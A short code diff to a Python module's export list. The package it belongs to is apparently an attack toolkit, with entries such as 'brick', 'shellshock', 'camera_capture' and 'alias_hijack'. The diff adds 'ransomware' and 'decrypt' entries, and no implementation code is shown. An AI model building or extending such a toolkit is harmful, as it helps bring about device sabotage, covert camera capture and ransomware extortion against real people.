@@ -7,10 +7,12 @@ __all__ = [
     "brick",
     "port_scan",
     "shellshock",
-    "camera_capture", 
+    "camera_capture",
     "send_email",
     "exploit",
-    "alias_hijack"
+    "alias_hijack",
+    "ransomware",
+    "decrypt"
 ]
 
 
